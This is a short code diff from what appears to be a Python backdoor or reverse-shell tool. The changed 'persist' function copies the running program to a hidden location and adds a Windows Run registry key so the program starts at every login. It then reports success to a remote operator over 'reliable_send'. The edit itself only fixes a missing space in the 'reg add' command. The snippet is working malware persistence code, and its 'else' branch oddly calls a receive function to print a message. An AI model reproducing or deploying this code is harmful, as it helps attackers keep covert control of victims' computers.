@@ -43,7 +43,7 @@ def persist(reg_name, copy_name):
     try:
         if not os.path.exists(file_location):
             shutil.copyfile(sys.executable, file_location)
-            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + '/t REG_SZ /d "' + file_location + '"', shell=True)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
             reliable_send(colored(f'[+] Createrd Persistence with reg key: {reg_name}', 'green'))
         else:
             reliable_recv(colored('[-] persistence already exists', 'yellow'))
